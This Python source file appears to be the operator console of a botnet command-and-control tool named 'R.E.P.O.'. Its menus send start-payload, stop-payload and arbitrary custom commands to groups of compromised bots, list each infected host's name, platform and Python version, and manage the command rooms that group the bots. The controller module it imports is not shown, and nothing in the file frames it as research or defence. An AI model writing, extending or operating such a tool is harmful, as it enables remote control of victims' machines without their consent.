
from botnetController import BotnetController, CommandRoom
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.align import Align
from rich.live import Live
import pyfiglet  

class BotnetGUI:
    def __init__(self, controller: BotnetController):
        self.controller = controller
        self.console = Console()
        self.commandroom_prefix = "cmd_"
        
    def print_ascii_title(self):
        ascii_title = pyfiglet.figlet_format("R.E.P.O.", font="slant")
        self.console.print(Align.center(ascii_title))

    def send_command(self):
        try:
            self.console.clear()
            self.console.print(Align.center(Panel("[bold green]Send Command[/]", expand=True)))
            
            send_to_all = Confirm.ask("[bold yellow]Send to all rooms?[/]")
            room = None if send_to_all else self.select_room()
            
            options = {
                "1": "Start Payload",
                "2": "Stop Payload",
                "3": "Custom Command",
            }
            
            table = Table()
            table.add_column("Option", justify="center", style="bold yellow")
            table.add_column("Description", style="bold white")
            
            for key, desc in options.items():
                table.add_row(key, desc)
            
            self.console.print(Align.center(table))
            
            choice = Prompt.ask("[bold white]Select an option[/]", choices=list(options.keys()))
            if choice == "1":
                self.execute_command(
                    room, 
                    self.controller.start_payload_all_rooms, 
                    self.controller.start_payload_on_room
                )
            elif choice == "2":
                self.execute_command(
                    room, 
                    self.controller.stop_payload_all_rooms, 
                    self.controller.stop_payload_on_room
                )
            elif choice == "3":
                command = Prompt.ask("[bold cyan]Enter the command to send (or press Enter to return)[/]")
                if command:
                    self.execute_command(
                        room, 
                        lambda: self.controller.send_to_all(command), 
                        lambda r: self.controller.send_command(command, r)
                    )
            else:
                self.console.print("[bold red]Invalid option! Try again.[/]")

        except Exception as e:
            self.console.print(f"[bold red]Error:[/] {str(e)}")

    def execute_command(self, room, all_rooms_method, single_room_method):
        if not room:
            all_rooms_method()
        else:
            single_room_method(room)
            
    def select_room(self):
        try:
            self.console.clear()
            self.console.print(Align.center(Panel("[bold green]Select Room[/]", expand=True)))
            room_list = list(self.controller.command_rooms.items())
            
            table = Table()
            table.add_column("Index", justify="center", style="bold yellow")
            table.add_column("Room Name", style="bold cyan")
            table.add_column("Bot Count", justify="center", style="bold magenta")
            
            for idx, (_, room) in enumerate(room_list):
                table.add_row(str(idx + 1), room.room.name[len(self.commandroom_prefix):], str(len(room.bots)))
            
            self.console.print(Align.center(table))
            
            room_nr = Prompt.ask("[bold white]Enter room number (or press Enter to return)[/]", choices=[str(i + 1) for i in range(len(room_list))] + [""])
            if room_nr == "":
                return
            room_nr = int(room_nr)
            _, room = room_list[room_nr - 1]
            return room
        except ValueError:
            self.console.print("[bold red]Invalid input. Please enter a valid number.[/]")
        except Exception as e:
            self.console.print(f"[bold red]Error:[/] {str(e)}")
            
    def show_bot_status_in_room(self, room: CommandRoom):
        while True:
            self.console.clear()
            self.console.print(Align.center(Panel(f"[bold green]Bots in Room: {room.room.name}[/]", expand=True)))

            bot_table = Table()
            bot_table.add_column("Bot ID", style="bold cyan")
            bot_table.add_column("Hostname", style="bold cyan")
            bot_table.add_column("Platform", style="bold cyan")
            bot_table.add_column("Platform Version", style="bold cyan")
            bot_table.add_column("Machine", style="bold cyan")
            bot_table.add_column("Python Version", style="bold cyan")
            

            for bot_id, [bot, _] in room.bots.items():
                bot_table.add_row(
                    bot_id, 
                    bot.hostname,
                    bot.platform,
                    bot.platform_version,
                    bot.machine,
                    bot.python_version
                )
            self.console.print(Align.center(bot_table))
            refresh = Prompt.ask("[bold white]Press Enter to return to the main menu...(r to refresh)", choices=["", 'r'])
            if refresh == "r":
                continue
            else:
                return

    def show_state(self):
        try:
            self.console.clear()
            self.console.print(Align.center(Panel("[bold green]Botnet State[/]", expand=True)))
            
            table = Table()
            table.add_column("Room Name", style="bold cyan")
            table.add_column("Bot Count", justify="center", style="bold magenta")
            table.add_column("Payload Status", justify="center")
            
            total_bots = 0
            room_list = list(self.controller.command_rooms.items())
            for _, room in room_list:
                bot_count = len(room.bots)
                total_bots += bot_count
                status = "[bold green]● Active[/]" if room.payload_status else "[bold red]● Inactive[/]"
                table.add_row(room.room.name[len(self.commandroom_prefix):], str(bot_count), status)
            
            self.console.print(Align.center(table))
            self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")

            room_names = [room.room.name[len(self.commandroom_prefix):] for _, room in room_list]
            room_name = Prompt.ask("[bold white]Enter the room name to view bots (or press Enter to return)", choices=room_names + [""])
            
            if room_name != "":
                room_name =  self.commandroom_prefix + room_name
                selected_room = [room for _, room in room_list if room.room.name == room_name][0]
                self.show_bot_status_in_room(selected_room)
            else:
                return

        except Exception as e:
            self.console.print(f"[bold red]Error:[/] {str(e)}")
    
    def create_room(self):
        try:
            self.console.clear()
            self.console.print(Align.center(Panel("[bold green]Create Room[/]", expand=True)))
            room_name = Prompt.ask("[bold yellow]Enter room name (or press Enter to return)[/]").replace(" ", "_")
            if room_name == "":
                return
            self.controller.add_command_room(room_name)
            self.console.print("[bold green]Room created successfully![/]")
        except Exception as e:
            self.console.print(f"[bold red]Error:[/] {str(e)}")
            
    def delete_room(self):
        try:
            self.console.clear()
            self.console.print(Align.center(Panel("[bold green]Delete Room[/]", expand=True)))
            room = self.select_room()
            self.controller.delete_room(room)
            self.console.print("[bold green]Room created successfully![/]")
        except Exception as e:
            self.console.print(f"[bold red]Error:[/] {str(e)}")
    
    def main_menu(self):
        while True:
            try:
                self.console.clear()
                self.print_ascii_title()
                
                table = Table()
                table.add_column("Option", justify="center", style="bold yellow")
                table.add_column("Description", style="bold white")
                
                options = {
                    "1": "Send Command",
                    "2": "Show Botnet State",
                    "3": "Create Room",
                    "4": "Delete Room",
                    "5": "Exit"
                }
                
                for key, desc in options.items():
                    table.add_row(key, desc)
                
                self.console.print(Align.center(table))
                choice = Prompt.ask("[bold white]Select an option[/]", choices=options.keys())
                
                match choice:
                    case "1":
                        self.send_command()
                    case "2":
                        self.show_state()
                    case "3":
                        self.create_room()
                    case "4":
                        self.delete_room()
                    case "5":
                        self.console.print("[bold red]Exiting...[/]")
                        break

                    case _:
                        self.console.print("[bold red]Invalid option! Try again.[/]")
            except Exception as e:
                self.console.print(f"[bold red]Error:[/] {str(e)}")
    
    def run(self):
        try:
            self.controller.run()
            self.main_menu()
        except Exception as e:
            self.console.print(f"[bold red]Error during startup:[/] {str(e)}")

if __name__ == "__main__":
    gui = BotnetGUI(BotnetController())
    gui.run()